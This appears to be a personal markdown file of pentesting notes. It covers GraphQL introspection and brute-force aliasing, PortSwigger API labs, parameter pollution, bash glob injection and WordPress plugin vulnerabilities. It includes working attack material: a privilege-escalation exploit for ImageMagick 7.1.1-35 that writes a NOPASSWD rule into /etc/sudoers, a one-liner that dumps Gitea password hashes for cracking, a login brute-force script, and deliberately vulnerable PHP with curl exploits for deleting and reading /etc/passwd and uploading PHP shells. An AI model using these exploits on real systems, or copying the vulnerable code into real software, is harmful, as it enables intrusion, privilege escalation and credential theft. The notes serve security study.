- Variables enable you to pass dynamic arguments, rather than having arguments directly within the query itself.Variable-based queries use the same structure as queries using inline arguments, but certain aspects of the query are taken from a separate JSON-based variables dictionary. They enable you to reuse a common structure among multiple queries, with only the value of the variable itself changing.When building a query or mutation that uses variables, you need to:

- Declare the variable and type.
- Add the variable name in the appropriate place in the query.
- Pass the variable key and value from the variable dictionary.

```graphql
   #Example query with variable

    query getEmployeeWithVariable($id: ID!) {
        getEmployees(id:$id) {
            name {
                firstname
                lastname
            }
         }
    }

    Variables:
    {
        "id": 1
    }
```

------------

### Aliases

------------

- GraphQL objects can't contain multiple properties with the same name. For example, the following query is invalid because it tries to return the product type twice.

```graphql
 #Invalid query

    query getProductDetails {
        getProduct(id: 1) {
            id
            name
        }
        getProduct(id: 2) {
            id
            name
        }
    }
```

- You can bypass that by creating aliases as seen below.

```graphql

    #Valid query using aliases

    query getProductDetails {
        product1: getProduct(id: "1") {
            id
            name
        }
        product2: getProduct(id: "2") {
            id
            name
        }
    }
```

- Response

```graphql
 #Response to query

    {
        "data": {
            "product1": {
                "id": 1,
                "name": "Juice Extractor"
             },
            "product2": {
                "id": 2,
                "name": "Fruit Overlays"
            }
        }
    }
```

-----------------

### Fragments

-----------------

- Fragments are reusable parts of queries and mutations.They contain a subset of the fields belonging to an associated type.Once defined, they can be included in queries or mutations. If they are subsequently changed, the change is included in every query or mutation that calls the fragment.
- Example-:

```graphql
 #Example fragment

    fragment productInfo on Product {
        id
        name
        listed
    }
```

- Query calling the fragment

```graphql
#Query calling the fragment

    query {
        getProduct(id: 1) {
            ...productInfo
            stock
        }
    }
```

- Response

```json

    #Response including fragment fields

    {
        "data": {
            "getProduct": {
                "id": 1,
                "name": "Juice Extractor",
                "listed": "no",
                "stock": 5
            }
        }
    }
```

- Subscription  are a special type of query. They enable clients to establish a long-lived connection with a server so that the server can then push real-time updates to the client without the need to continually poll for data. They are primarily useful for small changes to large objects and for functionality that requires small real-time updates (like chat systems or collaborative editing).

- Introspection is a built-in GraphQL function that enables you to query a server for information about the schema. It is commonly used by applications such as GraphQL IDEs and documentation generation tools.Like regular queries, you can specify the fields and structure of the response you want to be returned. For example, you might want the response to only contain the names of available mutations.Introspection can represent a serious information disclosure risk, as it can be used to access potentially sensitive information (such as field descriptions) and help an attacker to learn how they can interact with the API. It is best practice for introspection to be disabled in production environments.

--------------

### GRAPHQL vulnerabilities

-------------

- Graphql vulnerabilities arise from flaws in the implementation logic and design flaws.For example,if the information schema is left open, enabling attackers to query the api to get information of the schema.
- To test a graphql endpoint, send `query{__typename}`.The query works because every GraphQL endpoint has a reserved field called `__typename` that returns the queried object's type as a string.
- Common graphql endpoint-:

```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
```
- You can also try appending `/v1/` to the path.You should also note that GraphQL services will often respond to any non-GraphQL request with a "query not present" or similar error. You should bear this in mind when testing for GraphQL endpoints.
- The next step in trying to find GraphQL endpoints is to test using different request methods.It is best practice for production GraphQL endpoints to only accept POST requests that have a content-type of application/json, as this helps to protect against CSRF vulnerabilities. However, some endpoints may accept alternative methods, such as GET requests or POST requests that use a content-type of x-www-form-urlencoded.If you can't find the GraphQL endpoint by sending POST requests to common endpoints, try resending the universal query using alternative HTTP methods.

--------------------

### Exploiting unsanitized arguments

-------------------

- You can check for `Insecure Direct Object Reference`.The request below queries for a product list in a shop.

```graphql
#Example product query

    query {
        products {
            id
            name
            listed
        }
    }
```

- Id `3` has been delisted as seen in the response below

```json

    #Example product response

    {
        "data": {
            "products": [
                {
                    "id": 1,
                    "name": "Product 1",
                    "listed": true
                },
                {
                    "id": 2,
                    "name": "Product 2",
                    "listed": true
                },
                {
                    "id": 4,
                    "name": "Product 4",
                    "listed": true
                }
            ]
        }
```

- You can make a query by passing an argument.

```graphql
#Query to get missing product

    query {
        product(id: 3) {
            id
            name
            listed
        }
    }
```

-----------------

### More information can be gathered with introspection

-----------------

- To use introspection to discover schema information, query the `__schema` field. This field is available on the root type of all queries.
- You can probe for introspection with the query below.If introspection is enabled, the response returns the name of al availabel queries.

```json

    {
        "query": "{__schema{queryType{name}}}"
    }
```

- Running an introspection query

```graphql
#Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

- Note:If introspection is enabled but the above query doesn't run, try removing the onOperation, onFragment, and onField directives from the query structure. Many endpoints do not accept these directives as part of an introspection query, and you can often have more success with introspection by removing them.
- Even if introspection is entirely disabled, you can sometimes use suggestions to glean information on an API's structure.Suggestions are a feature of the Apollo GraphQL platform in which the server can suggest query amendments in error messages. These are generally used where a query is slightly incorrect but still recognizable (for example, There is no entry for 'productInfo'. Did you mean 'productInformation' instead?).You can potentially glean useful information from this, as the response is effectively giving away valid parts of the schema.
- Use [Clairvoyance](https://github.com/nikitastupin/clairvoyance) to grab possible graphql fields.

-----------------

### Accidental Exposure of private Graphql fields

- After using introspection to check for queries and fields,I noticed this `query`

```json
       {
          "kind": "OBJECT",
          "name": "query",
          "description": null,
          "fields": [
            {
              "name": "getBlogPost",
              "description": null,
              "args": [
                {
                  "name": "id",
                  "description": null,
                  "type": {
                    "kind": "NON_NULL",
                    "name": null,
                    "ofType": {
                      "kind": "SCALAR",
                      "name": "Int",
                      "ofType": null
                    }
                  },
                  "defaultValue": null
                }
```

- I noticed this query type to access users named `getUser` and it takes in a numerical id

```json
           {
              "name": "getUser",
              "description": null,
              "args": [
                {
                  "name": "id",
                  "description": null,
                  "type": {
                    "kind": "NON_NULL",
                    "name": null,
                    "ofType": {
                      "kind": "SCALAR",
                      "name": "Int",
                      "ofType": null
                    }
                  }
```

- This query accesses the object `User` that contains the `username` and `password`.

```json
       {
          "kind": "OBJECT",
          "name": "User",
          "description": null,
          "fields": [
            {
              "name": "id",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "Int",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "username",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "password",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            }
```

- Getting the password of `Administrator`

![image](https://github.com/user-attachments/assets/a0254b75-2eb2-4435-aaaf-ce10b7187778)

---------------

### Inline query for introspection

----------------

- Introspection Query to bypass `__schema` filter with `__schema%0A`-:

```
{__schema%0A{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name+description+locations+args{...InputValue}}}}fragment+FullType+on+__Type{kind+name+description+fields(includeDeprecated:true){name+description+args{...InputValue}type{...TypeRef}isDeprecated+deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name+description+isDeprecated+deprecationReason}possibleTypes{...TypeRef}}fragment+InputValue+on+__InputValue{name+description+type{...TypeRef}defaultValue}fragment+TypeRef+on+__Type{kind+name+ofType{kind+name+ofType{kind+name+ofType{kind+name+ofType{kind+name+ofType{kind+name+ofType{kind+name+ofType{kind+name}}}}}}}}
```

- Using mutation to delete users-:

```graphql
mutation {
    deleteOrganizationUser(input: {
        id: 3
    }) {
        user {
            id
            username
    }}
}
```

- Introspection result-:

```json
       {
          "kind": "OBJECT",
          "name": "mutation",
          "description": null,
          "fields": [
            {
              "name": "deleteOrganizationUser",
              "description": null,
              "args": [
                {
                  "name": "input",
                  "description": null,
                  "type": {
                    "kind": "INPUT_OBJECT",
                    "name": "DeleteOrganizationUserInput",
                    "ofType": null
                  },
                  "defaultValue": null
                }
              ],
              "type": {
                "kind": "OBJECT",
                "name": "DeleteOrganizationUserResponse",
                "ofType": null
              },
              "isDeprecated": false,
              "deprecationReason": null
            }
          ],
          "inputFields": null,
          "interfaces": [],
          "enumValues": null,
          "possibleTypes": null
        },
```

- Result of mutation

![image](https://github.com/user-attachments/assets/341dd53d-bc22-475b-b473-d375922a98b3)

---------------------

### Bypassing introspection query `__schema` with %0A

---------------------

- Query-:

![image](https://github.com/user-attachments/assets/32bdde35-149b-4b1d-881e-4bee3a691071)

----------------------

### Bruteforcing with Graphql aliases to bypass bruteforce

----------------------

- Bruteforce limit mechanism can be bypassed by creating aliases to make multiple queries or mutation
- In the case of this lab,I wrote a python script to generate 100 queries.

```python3
#! /usr/bin/env python3
#Generating graphql mutation's aliases script for Portswigger

passwords: list = open("passwords.txt","r").read().splitlines()
queries = open("queries.txt","w")
for num in range(0,100):
    query: str = "    loginme: login(input: {\n        username: \"carlos\",\n        password: \"filter\"}) {\n        token,\n        success\n    }\n".replace("filter",passwords[num])
    query = query.replace("loginme","login"+str(num))
    queries.write(query)
    print(query)

queries.close()
```

- The script writes the result to a file named `queries.txt`

![image](https://github.com/user-attachments/assets/95f7c9a3-bb4b-436e-b1e8-33e806d86d8d)

- Result-:

![image](https://github.com/user-attachments/assets/aed03659-3f32-4409-b350-e945494feebb)


---------------------

### [NAHAMSEC]]0XLUPIN's Graphql walkthrough

---------------------

### Tools

- Use `Gplspection` to grab the schema for a query or mutation`

Installation-:`pip install gqlspection`

- Use Clairvoyance to grab schema via introspection or fuzzing,you can also use it to grab a schema

Installation-:`pip install clairvoyance`

Syntax-:`clairvoyance <Graphql-endpoint> -o schema.json`

- Use `JSWzl` for generating graphql wordlists

-----------------------

###  API Testing <portswigger>

-----------------------

- APIs (Application Programming Interfaces) enable software systems and applications to communicate and share data. API testing is important as vulnerabilities in APIs may undermine core aspects of a website's confidentiality, integrity, and availability.
- Common routes to find api documentation

```
/api
/swagger/index.html
/openapi.json
/api/swagger/v1
/api/swagger
/api
```
----------------------

### Lab-:

----------------------

- The api documentation is at `/api/`.

![image](https://github.com/user-attachments/assets/b0bfd4e0-d2d8-4e60-b26d-368519bde769)

- User Deleted with the `/api/user` endpoint and the `DELETE` header

![image](https://github.com/user-attachments/assets/1b095022-8a8a-401c-b47f-8085f74ff215)

------------------------

### Using machine readable documentation

-------------------------

- You can parse documentation with burp extension `OpenApi Parser` and also specialized tools like `Postman` and `SoapUi`.
- Documentation or api endpoints can be identified with javascript files.. Burp Scanner automatically extracts some endpoints during crawls, but for a more heavyweight extraction, use the JS Link Finder BApp.Identifying content types can help to discover critical vulnerabilities e.g an api that supports json and xml might be vulnerable to XXE attacks.
- Don't forget to use `PATCH` http header to make partial change to a resource as seen below.Errors can also provide more insight to exploit a vulnerability.

![image](https://github.com/user-attachments/assets/c1ab19d6-94e4-455f-922e-6074b609229e)

---------------------------

### Finding Mass Assignment vulnerabilities

----------------------------

- After identifying an endpoint e.g `/api/user/update`,you can also add a payload to the `/update` position e.g `update` and `add` to test for other functionalities.When looking for hidden endpoints, use wordlists based on common API naming conventions and industry terms. Make sure you also include terms that are relevant to the application, based on your initial recon.You can also check for hidden parameters with burp extensions like `Param-Miner`,`Content-Discovery` and with `Burp intruder`.
- Mass-Assignment is also known as auto binding which works through internal parameters or when software auto binds a parameter to a request internally.Mass assignment may therefore result in the application supporting parameters that were never intended to be processed by the developer.
- Lab Solution-:

![image](https://github.com/user-attachments/assets/8539d086-5e9d-4e6a-a68a-2679210d0d5f)

-------------------

### Server Side Parameter Pollution

-------------------

- It occurs when a website embeds userinput to a server side request to an internal api without adequate encoding.This means that an attacker may be able to manipulate or inject parameters, which may enable them to override exisiting parameters, modify the application behaviour and access unauthorized data.Query parameters, form fields, headers, and URL path parameters may all be vulnerable

--------------------

### Testing for Server Side Parameter Pollution

---------------------

- To test for server-side parameter pollution in the query string, place query syntax characters like #, &, and = in your input and observe how the application responds.
- You can use a URL-encoded # character to attempt to truncate the server-side request. To help you interpret the response, you could also add a string after the # character.
- For example, you could modify the query string to the following:

`GET /userSearch?name=peter%23foo&back=/home`

- Ensure that `#` is url-encoded so that the front-end won't interpret it as a fragment.
- You can also add an invalid parameter but it should also be url encoded.

`GET /userSearch?name=peter%26email=foo&back=/home`

- Try to override the first parameter by creating a new parameter with the same name .The internal API interprets two name parameters. The impact of this depends on how the application processes the second parameter. This varies across different web technologies. For example:
- PHP parses the last parameter only. This would result in a user search for carlos.
- ASP.NET combines both parameters. This would result in a user search for peter,carlos, which might result in an Invalid username error message.
- Node.js / express parses the first parameter only. This would result in a user search for peter, giving an unchanged result.
- If you're able to override the original parameter, you may be able to conduct an exploit. For example, you could add name=administrator to the request. This may enable you to log in as the administrator user.
- Lab Solution-:


---------------

### Writing files with binary   `cat`

--------------

- Use-:

![image](https://github.com/user-attachments/assets/a84d8a6b-8e14-49dc-9aa5-df000edb9f6f)

----------------

### Resources on Unicode Normalization Attacks

---------------
### References-:
---------------
- [Unicode Python PEP Documentation](https://peps.python.org/pep-0672/)
- [Sloppy Joe's slide](https://docs.google.com/presentation/d/1Z-I9uPi2JGmc_jmAUFrt46rxFwLiqyiQc7z-o1i_I7Y/mobilepresent?slide=id.g2d1bb2d8abe_0_45)

----------------

### BASH GLOB INJECTION

-----------------

- Exploiting wildcards in Bash
- Executing commands with the wildcard `(*)` can pose a security risk e.g

![image](https://github.com/user-attachments/assets/5929627b-163d-451e-962c-5b381df2bf1d)

- Creating a file named "--help" and running "ls *" triggered file "--help" as an option instead.
- Running `strace` shows that it is triggered as an option.

![image](https://github.com/user-attachments/assets/3bf0f13c-87f2-4e9d-87b4-6c8126689123)

- Fix-: Wildcards should be used after the "--" option

![image](https://github.com/user-attachments/assets/4be55068-de05-4662-abb2-a25f2cd9f374)

-----------------

### REFERENCES-:

-----------------

- [Oxasploits](https://oxasploits.com/posts/bash-wildcard-expansion-arbitrary-command-line-arguments-0day/)

-----------------

### Exploitable Java Functions

-----------------

- [Stack Overflow](https://stackoverflow.com/questions/4339611/exploitable-java-functions)

------------------

### Exploiting SQLALCHEMY

-------------------

- The `order_by()` function in sqlalchemy is vulnerable to sql injection as seen in the [ctf-writeup](https://ctftime.org/writeup/33462).
- [Unsafe methods](https://stackoverflow.com/questions/6501583/sqlalchemy-sql-injection) but these methods are unsafe if string literals are passed.

```txt
filter   - uses _literal_as_text (NOT SAFE)
having   - uses _literal_as_text (NOT SAFE)

distinct - uses _literal_as_label_reference (NOT SAFE)
group_by - uses _literal_as_label_reference (NOT SAFE)
order_by - uses _literal_as_label_reference (NOT SAFE)

join     - uses model attributes to resolve relation (SAFE)
```

---------------

### Dumping Gitea Hashes from `gitea.db`

---------------

- Use this one liner-:
```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

![image](https://github.com/user-attachments/assets/1f0735a9-6c0b-4965-ab37-73e6f246798b)

- Then, Crack with hashcat

```bash
hashcat gitea.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
```
- To check the passwords with `--show`

```bash
hashcat --show gitea.hashes --user
```

-------------------

### Image magick 7.1.1-35 exploit

------------------

- Confirm version with `magick --version`

![image](https://github.com/user-attachments/assets/a6d2aee8-cf7c-4ed8-a55e-728b2da9cfe2)

- In current working directory,create this shared library file with the code below

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
  system("echo 'developer ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers");
  exit(0);
}
EOF
```

-----------------------

### REFERENCE

------------------------

- [ImageMagick](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)

-----------------------

### Source Code Review-> Wordpress

----------------------

### Wordpress Functions

----------------------

- `current_user_can`-:
- This function basically will check whether the current user has the specified capability. This function also accepts an ID of an object to check against if the capability is a meta capability. Meta capabilities such as edit_post and edit_user are capabilities used by the map_meta_cap function to map to primitive capabilities that a user or role has, such as `edit_posts` and `edit_others_posts`.

```php
current_user_can( 'edit_posts' );
current_user_can( 'edit_post', $post->ID );
current_user_can( 'manage_options' );
```

- [Capabilities in wordpress](https://wordpress.org/documentation/article/roles-and-capabilities/)

Roles-:
```
Super Admin
Administrator
Editor
Author
Contributor
Subscriber
```

- Defaults capabilities are assigned to each roles and can also be removed using `add_cap()` and `remove_cap()`.New roles can be introduced and removed with `add_role()` and `remove_role()` functions.
- The Super Admin role allows a user to perform all possible capabilities. Each of the other roles has a decreasing number of allowed capabilities. For instance, the `Subscriber` role has just the `read` capability. One particular role should not be considered to be senior to another role. Rather, consider that roles define the user’s responsibilities within the site.
- The difference between the `Super Admin` and the `Administrator` is that the former has access to the site network administration features and all other features while the latter has access to all the administration features within a single site.The subscriber can only read posts.

---------------------

- `wp_verify_nonce`-:It is one of the functions used to verify a nonce if it is correct within the 24 hours time limit.A nonce is valid for 24 hours (by default).The function is used to verify the nonce sent in the current request usually accessed by the $_REQUEST PHP variable.Nonces should never be relied on for authentication authorization, or access control. Protect your functions using the current_user_can function, always assume the nonce value can be compromised.
- Implementation-:

```php
$nonce = $_REQUEST['_wpnonce'];
if ( ! wp_verify_nonce( $nonce, 'my-nonce' ) || ! current_user_can("manage_options")) {
  die( __( 'Security check', 'textdomain' ) );
} else {
  // Do stuff here.
}
```
--------------------------

- `check_admin_referrer`-:One of the functions available to check for nonce value. This function ensures intent by verifying that a user was referred from another admin page with the correct security nonce.Nonces should never be relied on for authentication authorization, or access control. Protect your functions using the `current_user_can ` function, always assume the nonce value can be compromised.

- Implementation-:

```php
Nonces should never be relied on for authentication authorization, or access control. Protect your functions using the current_user_can function, always assume the nonce value can be compromised.
```

-----------------------

- `check_ajax_referrer`-:One of the functions to check for nonce value. This function verifies the Ajax request to prevent processing requests external to the blog by checking the nonce value.Nonces should never be relied on for authentication authorization, or access control. Protect your functions using the current_user_can function, always assume the nonce value can be compromised.
- Implementation-:

```php
/**
 * Check the referrer for the AJAX call.
 */
function wpdocs_action_function() {
    if(!current_user_can("manage_options")){
        die;
    }

  check_ajax_referer( 'wpdocs-special-string', 'security' );
  echo sanitize_text_field( $_POST['wpdocs_string'] );
  die;
}
add_action( 'wp_ajax_wpdocs_action', 'wpdocs_action_function' );
```

----------------------

- `register_rest_route`-: One of the functionalities or functions that are sometimes missed from a hacker’s point of view. This function’s purpose is to register a custom REST API route in the context of a plugin or theme.This function accepts $args as the third argument. The $args itself is either an array of options for the endpoint or an array of arrays for multiple methods.
- There is a permission callback which checks if a user can perform the action ( reading,updating etc). This allows the API to tell the client what actions they can perform on a given URL without needing to attempt the request first.

---------------------

### Hooks

---------------------

- Hooks are a piece of code to interact/modify another piece of code at specific, pre-defined spots.They make up the foundation for how plugins and themes interact with WordPress Core, but they’re also used extensively by Core itself.

--------------------

- `init`-: The init hook runs after the WordPress environment is loaded but before the current request is processed. This hook also allows developers to register custom post types, and taxonomies, or perform other tasks that need to be executed early in the WordPress loading process.This hook itself is accessible by unauthenticated users by default (also depends if the hook is registered outside from an additional permission check). Visiting the front page of a WordPress site should trigger the init hook.An unauthenticated user can simply visit the front page of a WordPress instance and it will trigger any function that is attached to the init hook.

- Implementation-:

```php
add_action( 'init', 'process_post' );

function process_post() {
    if( isset( $_POST['unique_hidden_field'] ) ) {
    // process $_POST data here, possibly need to add permission and nonce check first
    }
}
```

- Curl-:

```bash
curl [url]/?unique_hidden_field=1
```

- The `admin_init` hook is used to perform task when the admin panel is loaded.These tasks can include adding custom menus, registering custom post types or taxonomies, initializing settings, and performing security checks or authentication for admin-specific actions.The hook is similar to the `init` hook but it only fires as an admin screen or script is being initialized. This hook does not just run on user-facing admin screens, it also runs on the admin-ajax.php and admin-post.php endpoint as well.
- Implementation-:

```php
function myplugin_settings() {
    register_setting( 'myplugin', 'myplugin_setting_1', 'intval' );
    register_setting( 'myplugin', 'myplugin_setting_2', 'intval' );
}
add_action( 'admin_init', 'myplugin_settings' );
```

- Since this hook also runs on the admin-ajax.php and admin-post.php endpoint, an unauthenticated user can trigger this hook by simply visiting the URL below:

```bash
curl [url]/wp-admin/admin-ajax.php?action=myplugin-settings
```

- The `wp_ajax_${$action}` allows developers to handle custom AJAX endpoints. The wp_ajax_ hooks follow the format wp_ajax_$action, where $action variable comes from the action GET/POST parameter submitted to the admin-ajax.php endpoint.The hook only fires up  for users with `Subscriber+` role.A proper permission and nonce check is still needed to secure the function attached to this hook.
- Implementation-:

```php
add_action( 'wp_ajax_foobar', 'my_ajax_foobar_handler' );

function my_ajax_foobar_handler() {
    // Make your response and echo it.

    // Don't forget to stop execution afterward.
    wp_die();
}
```
- The `wp_ajax_nopriv_${action}` is the same as the `wp_ajax_${action}` except the `nopriv` part allows unauthenticated users to make `AJAX` requests i.e. when the `is_user_logged_in()` function returns false.
  
--------------------

### Arbitrary File deletion

----------------------

- Arbitrary file deletion-:It occurs when an attacker is able to delete files.Devs should always use the `sanitize_file_name` function to sanitize file name.Useful functions-:

- PHP_Related-:

```
unlink()
rmdir()
```

- Wordpress related-:

```
wp_delete_file
wp_delete_from_directory
WP_Filesystem_Direct::delete
Wp_Filesystem_Direct::rmdir
```

- Vulnerable code snippet-:

```php
add_action("init", "rest_init_setup");

function rest_init_setup(){
    register_rest_route( "myplugin/v1", '/deletemedia/', array(
        'methods'                   =>  "POST",
        'callback'                  =>  'delete_media_upload',
        'permission_callback' => '__return_true',
    ) );
}

function delete_media_upload($request){
    $args = json_decode($request->get_body(),true);
    $data = array('status'=>false);
    if(!empty($args['media']) ){
        wp_delete_file( $args['media']['file'] ); //Vulnerable function
        $data = array('status'=>true);
    }
    return new WP_REST_Response( $data, 200 );
}
```

- Exploit with curl-:

```bash
curl -u <url>/myplugin/v1/deletemedia -H "Content-Type: application/json" -d '{"media":{"file":"/etc/passwd"}'
```

----------------

### Arbitrary file read

-----------------

- This include improper file fetching handling in a plugin that can be used to read local files on the server.

- Useful php functions-:

```php
file_get_contents();
readfile()
fopen()
fread()
fgets()
fgetcsv()
fgetsss() deprecated from PHP 7.3
file
cURL
```

- Wordpress related -:

```
Wp_Filesystem_Direct::get_contents();
Wp_Filesystem_Direct::get_contents_array();
```

- Vulnerable Code-:

```php
add_action("wp_ajax_get_file", "ajax_get_file");

public function ajax_get_file(){
    global $wp_filesystem;

    // Make sure that the above variable is properly setup.
    require_once ABSPATH . 'wp-admin/includes/file.php';
    WP_Filesystem();

    $url = $_GET["url"];
    $data = $wp_filesystem->get_contents($url);
    $data = json_encode( $data );
    echo $data;
    die();
}
```

- Exploiting it-:A request will be made to `/wp-admin/admin-ajax.php?action=get_file

```bash
curl '<WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=get_file&url=/etc/passwd' -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
```
------------

### Authenticated Arbitrary file deletion in funnel forms 3.7.2

-------------

- Unlink function in function ` af2DeleteFontFile`

```php
 private function af2DeleteFontFile($filename) {
	        $upload_dir = wp_upload_dir();
	       
	        $af2_fonts_dir = $upload_dir['basedir'] . '/af2_fonts';
	       
	        $file_path = $af2_fonts_dir . '/' . $filename;
	        if (file_exists($file_path) && is_file($file_path)) {
	            unlink($file_path);
	            return true;
	        } else {
	            return false;
	        }
	    }
```
- Parameter that gets deleted

```php
          public function af2_delete_font() {
	        if ( !current_user_can( 'edit_others_posts' ) ) {
	            die( 'Permission denied' );
	        }
	        if ( ! isset( $_POST['nonce'] ) || ! wp_verify_nonce( $_POST['nonce'], 'af2_FE_nonce' ) ) {
	            die( 'Permission denied' );
	        }
	        $deleted = $this->af2DeleteFontFile($_POST['deletefile']);
	        if ($deleted) {
	            echo 'Datei erfolgreich gelöscht.';
	        } else {
	            echo 'Fehler beim Löschen der Datei oder Datei nicht gefunden.';
	        }
	        wp_die();
	    }
```
- Wp_action-:

```php
add_action( 'wp_ajax_af2_fnsf_delete_af2_font', array($this->Fnsf_Af2AjaxFormularbuilderFonts, 'af2_delete_font') );
```
- Exploitation-:

```bash
curl '<WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=af2_delete_font -d "deletefile=../../../../etc/passwd&nonce=[nonce]" -H "Cookie:<cookie>"
```

-----------------

### Arbitrary file upload

----------------

-  This includes improper file input handling inside of the plugin/theme which can be used to arbitrarily upload files including .php files to further achieve Remote Code Execution (RCE).
-  The most common way to trace a code file handling code is through the `$_FILES` php variable.Another way that is most of the time missed by hackers is via `WP_REST_Request::get_file_params` function. This function retrieves multipart file parameters from the body of a custom REST API route registered by the plugin/theme.

- Vulnerable file functions-:

```php
move_uploaded_file()
file_put_contents();
fwrite();
fputs();
copy();
fputcsv();
rename();
```

- Vulnerable wordpress functions-:

```php
WP_Filesystem_Direct::put_contents();
WP_Filesystem_Direct::move();
WP_Filesystem_Direct::copy();
```

----------------

### Compressed File Extraction

----------------

- One of the processes to upload a file is through an extraction of the compressed file. The compressed itself can vary from zip, gz, tar, rar, xz, 7z, etc. Most of the time, the developer forgets to implement a pre-check before the extraction process and it could lead to users uploading arbitrary files if the user can control the filename and the content of the extracted file.
- Worpress functions-:

```php
Ziparchive::extractTo();
Phardata::extractTo();
unzip_file();
```

- Vulnerable code_:Extraction is made without sanitizing the file.A malicious zip with a php file is uploaded  and checks is only made to ensure upload of a zip file.

```php
add_action("wp_ajax_unpack_fonts", "unpack_fonts");

function unpack_fonts(){
    $file = $_FILES["file"];
    $ext = end(explode('.',$file["name"]));

    if($ext !== "zip"){
        die();
    }

    $file_path = WP_CONTENT_DIR . "/uploads/" . $file["name"];
    move_uploaded_file($file["tmp_name"], $file_path);

    $zip = new ZipArchive;
    $f = $zip->open($file_path);

    if($f){
        $zip->extractTo(WP_CONTENT_DIR . "/uploads/"); //vulnerable code
        $zip->close();
    }
}
```

- Exploitation [Authenticated RCE]-:

```bash
curl [URL]/wp-admin/admin-ajax.php?action=unpack_fonts -H "Cookie: <authenticated_cookie>" -F "file=@/home/user.zip"
```

-----------------

### Bypass techniques

-----------------

- Developers check for the file extension type based on mime_type and forget to check the file extension name.
- Vulnerable code-:

```php
mime_content_type();
exif_imagetype();
finfo_file();
```

- Vulnerable code-:

```php
add_action("wp_ajax_nopriv_upload_image_check_mime", "upload_image_check_mime");

function upload_image_check_mime(){
    $file = $_FILES["file"];
    $file_type = mime_content_type($file["tmp_name"]);
    $file_path = WP_CONTENT_DIR . "/uploads/" . $file["name"];
    $allowed_mime_type = array("image/png", "image/jpeg");

    if(in_array($file_type, $allowed_mime_type)){
        move_uploaded_file($file["tmp_name"], $file_path);
        echo "file uploaded";
    }
    else{
        echo "file mime type not accepted";
    }
}
```

- Exploitiation-:You need to prepare a valid png with magicbytes and save with `.php` file.[Link to magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)

```bash
curl [url]/wp-admin/admin-ajax.php?action=upload_image_check_mime -F "file=@pwn.php"
```

------------------

### Image Related Check

------------------

- Sometimes developers check for conditions that a file is an image file e.g size `width and height`.One of the common functions to be used for image-related checks is `getimagesize` function.
- Vulnerable code-:

```php
add_action("wp_ajax_nopriv_upload_image_getimagesize", "upload_image_getimagesize");

function upload_image_getimagesize(){
    $file = $_FILES["file"];
    $file_path = WP_CONTENT_DIR . "/uploads/" . $file["name"];
    $size = getimagesize($file["tmp_name"]);
    $fileContent = file_get_contents($_FILES['file']["tmp_name"]);

    if($size){
        file_put_contents($file_path, $fileContent);
        echo "image uploaded";
    }
    else{
        echo "invalid image size";
    }
}
```
- To exploit,create a valid image file. add the malicious phpcode  to the metadata with `Exiftool` and rename the file extension with `.php`.
- Curl-:

```bash
curl -F 'file=@pwn.php' 'http://localhost/wp-admin/admin-ajax.php?action=upload_image_getimagesize'
```

-------------

### Blacklist bypass with .htaccess file

-------------

- It is common for blacklist-based extension checks to forget to include .htaccess files. Unfortunately, uploading a .htaccess file can lead to Remote Code Execution (RCE) because this file is used to configure how the web server (usually Apache) processes requests.
- For example, an attacker could use the .htaccess file to modify URL rewriting rules, allowing them to execute arbitrary PHP code embedded in user-controlled inputs or uploaded files. Additionally, directives like `AddHandler` or `SetHandler` can be used to force non-PHP files (like text files or images) to be interpreted as PHP, enabling the attacker to run server-side scripts that they previously uploaded.
- Vulnerable code-:

```php
function upload_image(){
    $file = $_FILES["file"];
    $file_path = WP_CONTENT_DIR . "/uploads/" . $file["name"];

    // File extension blacklist (dangerous files to disallow)
    $blacklist = array("php", "exe", "sh", "js", "bat", "pl", "py");

    // Get the file extension
    $file_ext = pathinfo($file["name"], PATHINFO_EXTENSION);

    // Check if the file extension is blacklisted
    if(in_array($file_ext, $blacklist)){
        echo "File type not allowed!";
        die();
    }

    // Process upload
}
```

